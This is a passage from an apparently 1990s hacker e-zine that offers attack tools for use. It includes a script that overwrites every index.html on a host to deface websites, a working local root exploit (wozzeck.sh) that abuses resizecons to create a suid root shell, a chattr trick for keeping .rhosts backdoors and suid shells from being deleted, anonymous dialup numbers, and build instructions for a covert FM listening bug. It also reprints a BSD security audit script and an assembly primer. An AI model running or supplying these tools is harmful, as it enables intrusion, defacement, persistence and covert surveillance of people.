    salt[0] = ptrkey[1]; salt[1] = ptrkey[0]; salt[2] = '\0';
    strcat(ptrkey, crypt(salt, ptrkey));
    salt[0] = ptrkey[0]; salt[1] = ptrkey[1]; salt[2] = '\0';
    strcat(ptrkey, crypt(salt, ptrkey));
    alarm(0);
}

void setTerm (int mode)
{
    static struct termios old, new;
 
    if (mode == 0) {
        tcgetattr(fileno(stdin), &old);
        memcpy(&new, &old, sizeof(struct termios));
        new.c_lflag &= ~(ICANON|ECHO);
        tcsetattr(fileno(stdin), TCSANOW, &new);
    } else tcsetattr(fileno(stdin), TCSANOW, &old); 
}

void sighandler()
{
printf("\nReceive abort.......exiting now.\n");
printf("Output file was NOT saved.\n");
unlink(OutputFile);
exit(1);
}
        
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Replaceit.sh : Shok / so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Replaces ALL index.html files on the system with the one you specify as
the second argument. Obviously this is useful on a large webhosting site
;)

#!/bin/sh
# This isn't really a script but ya know that's life...
# This was just made to make life a little easier -- 
#
# Use with -- sh replaceit.sh <thefile.html>

if [ $1 == "" ]
then
echo "Usage: replaceit.sh <file>"
echo "This will replace every index.html on the system with <file>"
else
find / -name "index.html" -print -exec cp -f $1 {} \; 2>/dev/null &
echo "Okay it's running in the background...enjoy :)"
fi

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Security.sh : Berkeley
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/sh -
#
#       @(#)security    8.1 (Berkeley) 6/9/93
#

PATH=/sbin:/usr/sbin:/bin:/usr/bin

umask 077

ERR=/tmp/_secure1.$$
TMP1=/tmp/_secure2.$$
TMP2=/tmp/_secure3.$$
TMP3=/tmp/_secure4.$$
LIST=/tmp/_secure5.$$
OUTPUT=/tmp/_secure6.$$

trap 'rm -f $ERR $TMP1 $TMP2 $TMP3 $LIST $OUTPUT' 0

# Check the master password file syntax.
MP=/etc/master.passwd
awk -F: '{
        if ($0 ~ /^[     ]*$/) {
                printf("Line %d is a blank line.\n", NR);
                next;
        }
        if (NF != 10)
                printf("Line %d has the wrong number of fields.\n", NR);
        if ($1 !~ /^[A-Za-z0-9]*$/)
                printf("Login %s has non-alphanumeric characters.\n", $1);
        if (length($1) > 16)
                printf("Login %s has more than 16 characters.\n", $1);
        if ($2 == "")
                printf("Login %s has no password.\n", $1);
        if (length($2) != 13 && length($2) != 20 && \
            ($10 ~ /.*sh$/ || $10 == ""))
                printf("Login %s is off but still has a valid shell.\n", $1);
        if ($3 == 0 && $1 != "root" && $1 != "toor")
                printf("Login %s has a user id of 0.\n", $1);
        if ($3 < 0)
                printf("Login %s has a negative user id.\n", $1);
        if ($4 < 0)
                printf("Login %s has a negative group id.\n", $1);
}' < $MP > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking the $MP file:\n"
        cat $OUTPUT
fi

awk -F: '{ print $1 }' $MP | sort | uniq -d > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\n$MP has duplicate user names.\n"
        column $OUTPUT
fi

awk -F: '{ if ($1 != "toor") print $1 " " $3 }' $MP | sort -n +1 | tee $TMP1 |
uniq -d -f 1 | awk '{ print $2 }' > $TMP2
if [ -s $TMP2 ] ; then
        printf "\n$MP has duplicate user id's.\n"
        while read uid; do
                grep -w $uid $TMP1
        done < $TMP2 | column
fi

# Backup the master password file; a special case, the normal backup
# mechanisms also print out file differences and we don't want to do
# that because this file has encrypted passwords in it.
CUR=/var/backups/`basename $MP`.current
BACK=/var/backups/`basename $MP`.backup
if [ -s $CUR ] ; then
        if cmp -s $CUR $MP; then
                :
        else
                cp -p $CUR $BACK
                cp -p $MP $CUR
                chown root.wheel $CUR
        fi
else
        cp -p $MP $CUR
        chown root.wheel $CUR
fi

# Check the group file syntax.
GRP=/etc/group
awk -F: '{
        if ($0 ~ /^[     ]*$/) {
                printf("Line %d is a blank line.\n", NR);
                next;
        }
        if (NF != 4)
                printf("Line %d has the wrong number of fields.\n", NR);
        if ($1 !~ /^[A-za-z0-9]*$/)
                printf("Group %s has non-alphanumeric characters.\n", $1);
        if (length($1) > 8)
                printf("Group %s has more than 8 characters.\n", $1);
        if ($3 !~ /[0-9]*/)
                printf("Login %s has a negative group id.\n", $1);
}' < $GRP > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking the $GRP file:\n"
        cat $OUTPUT
fi

awk -F: '{ print $1 }' $GRP | sort | uniq -d > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\n$GRP has duplicate group names.\n"
        column $OUTPUT
fi

# Check for root paths, umask values in startup files.
# The check for the root paths is problematical -- it's likely to fail
# in other environments.  Once the shells have been modified to warn
# of '.' in the path, the path tests should go away.
> $TMP1
> $OUTPUT
rhome=/root
umaskset=no
list="/etc/csh.cshrc /etc/csh.login ${rhome}/.cshrc ${rhome}/.login"
for i in $list ; do
        if [ -f $i ] ; then
                if egrep umask $i > /dev/null ; then
                        umaskset=yes
                fi
                egrep umask $i |
                awk '$2 % 100 < 20 \
                        { print "Root umask is group writeable" }
                     $2 % 10 < 2 \
                        { print "Root umask is other writeable" }' >> $OUTPUT
                /bin/csh -f -s << end-of-csh > /dev/null 2>&1
                        unset path
                        source $i
                        /bin/ls -ldgT \$path > $TMP1
end-of-csh
                awk '{
                        if ($10 ~ /^\.$/) {
                                print "The root path includes .";
                                next;
                        }
                     }
                     $1 ~ /^d....w/ \
        { print "Root path directory " $10 " is group writeable." } \
                     $1 ~ /^d.......w/ \
        { print "Root path directory " $10 " is other writeable." }' \
                < $TMP1 >> $OUTPUT
        fi
done
if [ $umaskset = "no" -o -s $OUTPUT ] ; then
        printf "\nChecking root csh paths, umask values:\n$list\n"
        if [ -s $OUTPUT ]; then
                cat $OUTPUT
        fi
        if [ $umaskset = "no" ] ; then
                printf "\nRoot csh startup files do not set the umask.\n"
        fi
fi

> $OUTPUT
rhome=/root
umaskset=no
list="${rhome}/.profile"
for i in $list; do
        if [ -f $i ] ; then
                if egrep umask $i > /dev/null ; then
                        umaskset=yes
                fi
                egrep umask $i |
                awk '$2 % 100 < 20 \
                        { print "Root umask is group writeable" } \
                     $2 % 10 < 2 \
                        { print "Root umask is other writeable" }' >> $OUTPUT
                /bin/sh << end-of-sh > /dev/null 2>&1
                        PATH=
                        . $i
                        list=\`echo \$PATH | /usr/bin/sed -e 's/:/ /g'\`
                        /bin/ls -ldgT \$list > $TMP1
end-of-sh
                awk '{
                        if ($10 ~ /^\.$/) {
                                print "The root path includes .";
                                next;
                        }
                     }
                     $1 ~ /^d....w/ \
        { print "Root path directory " $10 " is group writeable." } \
                     $1 ~ /^d.......w/ \
        { print "Root path directory " $10 " is other writeable." }' \
                < $TMP1 >> $OUTPUT

        fi
done
if [ $umaskset = "no" -o -s $OUTPUT ] ; then
        printf "\nChecking root sh paths, umask values:\n$list\n"
        if [ -s $OUTPUT ]; then
                cat $OUTPUT
        fi
        if [ $umaskset = "no" ] ; then
                printf "\nRoot sh startup files do not set the umask.\n"
        fi
fi

# Root and uucp should both be in /etc/ftpusers.
if egrep root /etc/ftpusers > /dev/null ; then
        :
else
        printf "\nRoot not listed in /etc/ftpusers file.\n"
fi
if egrep uucp /etc/ftpusers > /dev/null ; then
        :
else
        printf "\nUucp not listed in /etc/ftpusers file.\n"
fi

# Uudecode should not be in the /etc/aliases file.
if egrep 'uudecode:.*\||decode:.*\|' /etc/aliases; then
        printf "\nProgram entry for uudecode exists in the /etc/aliases file.\n"
fi

# Files that should not have + signs.
list="/etc/hosts.equiv /etc/hosts.lpd"
for f in $list ; do
        if egrep '\+' $f > /dev/null ; then
                printf "\nPlus sign in $f file.\n"
        fi
done

# Check for special users with .rhosts files.  Only root and toor should
# have a .rhosts files.  Also, .rhosts files should not have plus signs.
awk -F: '$1 != "root" && $1 != "toor" && \
        ($3 < 100 || $1 == "ftp" || $1 == "uucp") \
                { print $1 " " $6 }' /etc/passwd |
while read uid homedir; do
        if [ -f ${homedir}/.rhosts ] ; then
                rhost=`ls -ldgT ${homedir}/.rhosts`
                printf "$uid: $rhost\n"
        fi
done > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking for special users with .rhosts files:\n"
        cat $OUTPUT
fi

awk -F: '{ print $1 " " $6 }' /etc/passwd | \
while read uid homedir; do
        if [ -f ${homedir}/.rhosts ] && \
            egrep '\+' ${homedir}/.rhosts > /dev/null 2>&1; then
                printf "$uid: + in .rhosts file.\n"
        fi
done > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking .rhosts files syntax:\n"
        cat $OUTPUT
fi

# Check home directories.  Directories should not be owned by someone else
# or writeable.
awk -F: '{ print $1 " " $6 }' /etc/passwd | \
while read uid homedir; do
        if [ -d ${homedir}/ ] ; then
                file=`ls -ldgT ${homedir}`
                printf "$uid $file\n"
        fi
done |
awk '$1 != $4 && $4 != "root" \
        { print "user " $1 " home directory is owned by " $4 }
     $2 ~ /^-....w/ \
        { print "user " $1 " home directory is group writeable" }
     $2 ~ /^-.......w/ \
        { print "user " $1 " home directory is other writeable" }' > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking home directories:\n"
        cat $OUTPUT
fi

# Files that should not be owned by someone else or readable.
list=".netrc .rhosts"
awk -F: '{ print $1 " " $6 }' /etc/passwd | \
while read uid homedir; do
        for f in $list ; do
                file=${homedir}/${f}
                if [ -f $file ] ; then
                        printf "$uid $f `ls -ldgT $file`\n"
                fi
        done
done |
awk '$1 != $5 && $5 != "root" \
        { print "user " $1 " " $2 " file is owned by " $5 }
     $3 ~ /^-...r/ \
        { print "user " $1 " " $2 " file is group readable" }
     $3 ~ /^-......r/ \
        { print "user " $1 " " $2 " file is other readable" }
     $3 ~ /^-....w/ \
        { print "user " $1 " " $2 " file is group writeable" }
     $3 ~ /^-.......w/ \
        { print "user " $1 " " $2 " file is other writeable" }' > $OUTPUT

# Files that should not be owned by someone else or writeable.
list=".bashrc .cshrc .emacs .emacsrc .exrc .forward .klogin .login \
      .logout .profile .tcshrc"
awk -F: '{ print $1 " " $6 }' /etc/passwd | \
while read uid homedir; do
        for f in $list ; do
                file=${homedir}/${f}
                if [ -f $file ] ; then
                        printf "$uid $f `ls -ldgT $file`\n"
                fi
        done
done |
awk '$1 != $5 && $5 != "root" \
        { print "user " $1 " " $2 " file is owned by " $5 }
     $3 ~ /^-....w/ \
        { print "user " $1 " " $2 " file is group writeable" }
     $3 ~ /^-.......w/ \
        { print "user " $1 " " $2 " file is other writeable" }' >> $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking dot files:\n"
        cat $OUTPUT
fi

# Mailboxes should be owned by user and unreadable.
ls -l /var/mail | sed 1d | \
awk '$3 != $9 && $9 != "."$3".pop"\
        { print "user " $9 " mailbox is owned by " $3 }
     $1 != "-rw-------" \
        { print "user " $9 " mailbox is " $1 ", group " $4 }' > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking mailbox ownership:\n"
        cat $OUTPUT
fi

# File systems should not be globally exported.
if [ -s /etc/exports ] ; then
        awk '{
                readonly = 0;
                for (i = 2; i <= NF; ++i) {
                        if ($i ~ /-ro/)
                                readonly = 1;
                        else if ($i !~ /^-/)
                                next;
                }
                if (readonly)
                        print "File system " $1 " globally exported, read-only."
                else
                        print "File system " $1 " globally exported, read-write."
        }' < /etc/exports > $OUTPUT
        if [ -s $OUTPUT ] ; then
                printf "\nChecking for globally exported file systems:\n"
                cat $OUTPUT
        fi
fi

# Display any changes in setuid files and devices.
printf "\nChecking setuid files and devices:\n"
(find / ! -fstype local -a -prune -o \
    \( -perm -u+s -o -perm -g+s -o ! -type d -a ! -type f -a ! -type l -a \
       ! -type s \) | \
sort | sed -e 's/^/ls -ldgT /' | sh > $LIST) 2> $OUTPUT

# Display any errors that occurred during system file walk.
if [ -s $OUTPUT ] ; then
        printf "Setuid/device find errors:\n"
        cat $OUTPUT
        printf "\n"
fi

# Display any changes in the setuid file list.
egrep -v '^[bc]' $LIST > $TMP1
if [ -s $TMP1 ] ; then
        # Check to make sure uudecode isn't setuid.
        if grep -w uudecode $TMP1 > /dev/null ; then
                printf "\nUudecode is setuid.\n"
        fi

        CUR=/var/backups/setuid.current
        BACK=/var/backups/setuid.backup

        if [ -s $CUR ] ; then
                if cmp -s $CUR $TMP1 ; then
                        :
                else
                        > $TMP2
                        join -110 -210 -v2 $CUR $TMP1 > $OUTPUT
                        if [ -s $OUTPUT ] ; then
                                printf "Setuid additions:\n"
                                tee -a $TMP2 < $OUTPUT
                                printf "\n"
                        fi

                        join -110 -210 -v1 $CUR $TMP1 > $OUTPUT
                        if [ -s $OUTPUT ] ; then
                                printf "Setuid deletions:\n"
                                tee -a $TMP2 < $OUTPUT
                                printf "\n"
                        fi

                        sort +9 $TMP2 $CUR $TMP1 | \
                            sed -e 's/[  ][      ]*/ /g' | uniq -u > $OUTPUT
                        if [ -s $OUTPUT ] ; then
                                printf "Setuid changes:\n"
                                column -t $OUTPUT
                                printf "\n"
                        fi

                        cp $CUR $BACK
                        cp $TMP1 $CUR
                fi
        else
                printf "Setuid additions:\n"
                column -t $TMP1
                printf "\n"
                cp $TMP1 $CUR
        fi
fi

# Check for block and character disk devices that are readable or writeable
# or not owned by root.operator.
>$TMP1
DISKLIST="dk hd hk hp jb kra ra rb rd rl rx rz sd up wd"
for i in $DISKLIST; do
        egrep "^b.*/${i}[0-9][0-9]*[a-h]$"  $LIST >> $TMP1
        egrep "^c.*/r${i}[0-9][0-9]*[a-h]$"  $LIST >> $TMP1
done

awk '$3 != "root" || $4 != "operator" || $1 !~ /.rw-r-----/ \
        { printf("Disk %s is user %s, group %s, permissions %s.\n", \
            $10, $3, $4, $1); }' < $TMP1 > $OUTPUT
if [ -s $OUTPUT ] ; then
        printf "\nChecking disk ownership and permissions:\n"
        cat $OUTPUT
        printf "\n"
fi

# Display any changes in the device file list.
egrep '^[bc]' $LIST | sort +9 > $TMP1
if [ -s $TMP1 ] ; then
        CUR=/var/backups/device.current
        BACK=/var/backups/device.backup

        if [ -s $CUR ] ; then
                if cmp -s $CUR $TMP1 ; then
                        :
                else
                        > $TMP2
                        join -110 -210 -v2 $CUR $TMP1 > $OUTPUT
                        if [ -s $OUTPUT ] ; then
                                printf "Device additions:\n"
                                tee -a $TMP2 < $OUTPUT
                                printf "\n"
                        fi

                        join -110 -210 -v1 $CUR $TMP1 > $OUTPUT
                        if [ -s $OUTPUT ] ; then
                                printf "Device deletions:\n"
                                tee -a $TMP2 < $OUTPUT
                                printf "\n"
                        fi

                        # Report any block device change.  Ignore character
                        # devices, only the name is significant.
                        cat $TMP2 $CUR $TMP1 | \
                        sed -e '/^c/d' | \
                        sort +9 | \
                        sed -e 's/[      ][      ]*/ /g' | \
                        uniq -u > $OUTPUT
                        if [ -s $OUTPUT ] ; then
                                printf "Block device changes:\n"
                                column -t $OUTPUT
                                printf "\n"
                        fi

                        cp $CUR $BACK
                        cp $TMP1 $CUR
                fi
        else
                printf "Device additions:\n"
                column -t $TMP1
                printf "\n"
                cp $TMP1 $CUR
        fi
fi

# Check special files.
# Check system binaries.
#
# Create the mtree tree specifications using:
#
#       mtree -cx -pDIR -kcksum,gid,mode,nlink,size,link,time,uid > DIR.secure
#       chown root.wheel DIR.SECURE
#       chmod 600 DIR.SECURE
#
# Note, this is not complete protection against Trojan horsed binaries, as
# the hacker can modify the tree specification to match the replaced binary.
# For details on really protecting yourself against modified binaries, see
# the mtree(8) manual page.
if cd /etc/mtree; then
        mtree -e -p / -f /etc/mtree/special > $OUTPUT
        if [ -s $OUTPUT ] ; then
                printf "\nChecking special files and directories:\n"
                cat $OUTPUT
        fi

        > $OUTPUT
        for file in *.secure; do
                tree=`sed -n -e '3s/.* //p' -e 3q $file 2>/dev/null`
                mtree -f $file -p $tree > $TMP1 2>/dev/null
                if [ -s $TMP1 ]; then
                        printf "\nChecking $tree:\n" >> $OUTPUT
                        cat $TMP1 >> $OUTPUT
                fi
        done
        if [ -s $OUTPUT ] ; then
                printf "\nChecking system binaries:\n"
                cat $OUTPUT
        fi
fi

# List of files that get backed up and checked for any modifications.  Each
# file is expected to have two backups, /var/backups/file.{current,backup}.
# Any changes cause the files to rotate.
if [ -s /etc/changelist ] ; then
        for file in `cat /etc/changelist`; do
                CUR=/var/backups/`basename $file`.current
                BACK=/var/backups/`basename $file`.backup
                if [ -s $file ]; then
                        if [ -s $CUR ] ; then
                                diff $CUR $file > $OUTPUT
                                if [ -s $OUTPUT ] ; then
                printf "\n======\n%s diffs (OLD < > NEW)\n======\n" $file
                                        cat $OUTPUT
                                        cp -p $CUR $BACK
                                        cp -p $file $CUR
                                        chown root.wheel $CUR $BACK
                                fi
                        else
                                cp -p $file $CUR
                                chown root.wheel $CUR
                        fi
                fi
        done
fi

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Wozzeck.sh : Dave M.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/sh
#
# wozzeck.sh
# exploits a security hole in /usr/bin/resizecons
# to create a suid root shell in /tmp/wozz on a
# linux Red Hat 2.1 system.
#
# by Dave M. (davem@cmu.edu) : CMU is for g1mps - so1o
#

echo ================ wozzeck.sh - gain root on Linux Red Hat 2.1 system
echo ================ Checking system vulnerability
if test -u /usr/bin/resizecons
then
echo ++++++++++++++++ System appears vulnerable.
cd /tmp
cat << _EOF_ > /tmp/313x37
This exploit is dedicated to
Wozz.  Use it with care.
_EOF_
cat << _EOF_ > /tmp/restoretextmode
#!/bin/sh
/bin/cp /bin/sh /tmp/wozz
/bin/chmod 4777 /tmp/wozz
_EOF_
/bin/chmod +x /tmp/restoretextmode
PATH=/tmp
echo ================ Executing resizecons
/usr/bin/resizecons 313x37
/bin/rm /tmp/restoretextmode
/bin/rm /tmp/313x37
if test -u /tmp/wozz
then
echo ++++++++++++++++ Exploit successful, suid shell located in /tmp/wozz
else
echo ---------------- Exploit failed
fi
else
echo ---------------- This machine does not appear to be vulnerable.
fi

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Chattr tekneeq : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Heh, another short thing:

when you have made a .rhosts file on a machine, you can
set filesystem attributes to make it undeletable :]

simple really, but only any use on linux (ext2fs) 
and you have to be root to use chattr...

  bash# chattr +i <filename>

Now when anyone, even root tries to rm or change that file, he will
get an 'override mode 644?' message and then permission
denied . Of course, any admin who knows how to use chattr
can simply chattr -i <filename>, although it might not
be immediately apparent to them that this is all due
to our friend chattr :] 

(NB. you might want to use this in conjunction with Shok's
     trojan rm, incase someone finds out the trojan. It's also 
     useful for any suid shell backdoors etc..use your
     imagination!)


Another thing chattr can provide is secure deletion, where
the blocks on the disk used by the file are changed to 
zero's and written back. So if you have any files of a 
'sensitive' nature on your machine, you can use chattr
to ease your paranoia a little ...

  bash# chattr -R +s /dir

which will recursively add the secure deletion attrib to the files
in /dir

Now you can be extra sure that the data really _is_ gone if the
time comes to rm it ...

So all you admins, if you now realise why you cannot rm that suid shell
or .rhosts file, try chattr -i <filename> ;)

Of course, you all know how 'man chattr' works so you know all this
already :]

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. 617 dialups : zer0x
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

617 Telnet Dialups

If your not in area code 617 this may not be very usefull to you, but then
again for ultimate safety you could always use this from some telnet outdial
or whatever. I will try to put something in for other area codes in later
issues.
hello kiddies. Sometimes if you want to connect somewhere, you don't want
to go through a ppp, even if it isnt legit. Personally I think ppp's are
good if they're from a big isp because theres less chance of you being
monitored. Some very cool people offer telnet dialups, MIT is one of them.
Instead of just having ones for students they have a public one.
It is called "Terminus". When you dial any of the following Terminus
dialups:

  (617) 258-7111
  (617) 258-7115
  (617) 258-7116
  (617) 258-7126
  (617) 258-7112

When you dial up it spits some shit at you:

"Welcome to the MIT Laboratory for Computer Science.
You are connected to the dialup server: TERMINUS
Report problems to Bug-Dialup@lcs.mit.edu
Administrative questions should be directed to Dialup-Admin@lcs.mit.edu
Contact Dialup-Users-Request@lcs.mit.edu for service info and updates.
All users, especially guests, should get this info.
Guests who use the LCS dialup servers and don't follow the guidelines are
endangering the availability of dialup servers for all guests.
Guest restrictions:     ON at 60%     OFF at 50%"

And then it pops up a little telnet prompt. 

"Terminus>"

Type ? for help, or just enter the host you want to connect to.
For some hosts it now says "connection not permitted to this host".
This may be because shell providers are tired of little kiddies
like some of you connecting to hosts and rooting through it. .
Also, sometimes for some odd reason you can't connect to some hosts.
I suggest you use this in moderation. Who knows, maybe when some sysadmin
will get especially pissed he will ask MIT to set up a line trace and get
your #, or contact MIT and they will be forced to shut it down for ever.
Or even if MIT gets pissed they may start monitoring all login sessions.
So play nice, or mom my will take your dialup away.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. FM radio bugs : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

OK, so1o has been asking for this for ages, not to mention other
people, so I finally got round to typing it up. Basically, this
is a fairly small FM transmitter, powered by two 3 volt lithium
cells. The only slight drawback is that it requires a 170cm 
antenna if you want to get decent range out of it. This isn't 
too much of a problem though, as it is fairly easy to hide a few
feet of wire...

As for performance you can expect a range of around 500m with a
good antenna. The actual output is around 10mv, which is fine for
our, <ahem> applications :)

If you don't know what a soldering iron is or can't read circuit
diagrams, it's probably not a good idea to attempt to make this, 
as it is fairly complicated for a beginner.

 Anyway, heres the parts list:

1 - 470R 1/4 watt resistor
1 - 22k   "   "      "
1 - 47k   "   "      "
1 - 100k  "   "      "
1 - 1M    "   "      "

1 - 5p6 ceramic capacitor
1 - 27p   "        "
1 - 47p   "        "
1 - 1n    "        "
2 - 22n   "        "
1 - 100n monoblock (monolithic)

2 - BC 547 transistors

1 - electret mic insert (small == good :)

2 - 3v Lithium cells

1 - Single pole double throw (SPDT) mini slide switch

enamelled .5mm copper wire
hookup wire
shrinkwrap tubing

It is best to make a PCboard from the diagram supplied, 
as the positioning of the components is quite important.

You could also try using veroboard to make a similar
layout...

OK, most of this is fairly straightforward, but there are 
a few things you need to be careful with. 

You will need to make 2 coils with the enamelled wire.
To do this, use a match to burn the enamel off the wire
and clean off the black residue left over. 

You need something cylindrical and 2 mm in diameter as a
former for winding the coils. 

The first coil needs 8 turns of .5 mm wire, and the second
needs 5 turns. 

The second thing to remember is that the transistors _must_ 
be kept as close the the board as possible, so they dont 
stick up higher than any of the other components. The coils
should be touching the board as well. If you deviate from
the original layout a lot, there is a good chance the thing
will be very sensitive to enviromental changes, such as 
temperature or being touched. The project is not designed to
be carried around in use, although if a good casing was made
as opposed to shrinkwrap, it might become more stable. The 
ideal application is to have the transmitter taped under a
desk, with the arial running straight down the back.

If you are looking for good electret mic's, you can get
really good ones out of dead mobile's :)

You should also ensure you dont over heat components when
you are soldering, especially the transistors and the mic.

Right, so grab the diags and go build it :)

I'll leave the attachment of the two cells up to you, but I
_don't_ recommmend attempting to solder them :) The best
arrangement is to tape the two cells together with wires 
on the top and bottom as shown in my mad ascii art:

                -----========== (+)
         [^^^^^^^^^^^^^^^^^^]
         \__________________/
         [^^^^^^^^^^^^^^^^^^]
         \__________________/
                -----========== (-)          

OK, so you have built it, and you want to know how to use it...

The bug transmit's around the 88 - 108 FM range,  and can be
picked up with any FM radio. To adjust the frequency, squeeze
together the turns of the 5 turn coil (oscillator coil) to 
shift the frequency up the range, and seperate the turns to
move down the range. To test it, place it near a radio
and tune over the whole FM band, and at some point near the 
lower end, you should hear a feedback whistle. Adjust the coil
unti you get  a frequency that is good (i.e free) and then you 
are ready for action :) Its a good idea to shrinkwrap the
project, but make sure you dont mess up the coils when you 
shrink it. 

Thats all...

I will put plans for a much more elaborate and enhanced bug
in crh (with Voice Operated Transmit and surface mount
components for small size :) as soon as I can be fucked with 
typing it up...

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. AT&T and Intel assembly syntax.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

               Difference Between AT&T and Intel Assembly Syntax
               -------------------------------------------------
                            By (--==+*~Shok~*+==--)

The difference
--------------

This document is more related to coding than hacking, although assembly is
a very useful programming language, as it's machine level and gives you
the most direct access to the CPU, hardware, etc. Now in unix, the
compilers like gcc use att syntax assembly and not intel. For example:

__asm__("movl %esp, %ebp"); 

Now this is unfortunate for DOS asm programmers who recently installed linux.
Asm they don't know att syntax (they are used to intel)..who are used to mov ebp, esp
from the above example.

	So I added this because I've very rarely (only one in fact, to be honest),
document that explained (yah, it wasn't even a tutorial or anything ;) the
differences, how to get used to it etc.  

	First off, I'd like to mention the only place I've seen any
documentation on it, which was the manual for gas (which is GNU
asm....gnu's assembler). 
You can get info on that at:
http://www.cs.utah.edu/csinfo/texinfo under "gas"

First let me give a few examples. 
Intel: push 4
att: pushl $4

All the immediate operands have a $ in front of them, in intel syntax, you
don't have prefix.

The register operands, have a % in front of them, intel has none.
Intel: mov eax, 4
att: movl $4, %eax

You notice there is a diff in intel/att's src/dst...
Intel: you do dst, src like mov ax, 2  
att: it's the opposite, src, dst like movl $2, %ax

You can use 'b' for byte, 'w' for word, 'l' for long, etc...as the memory
suffix:
movl, movb, movw etc....
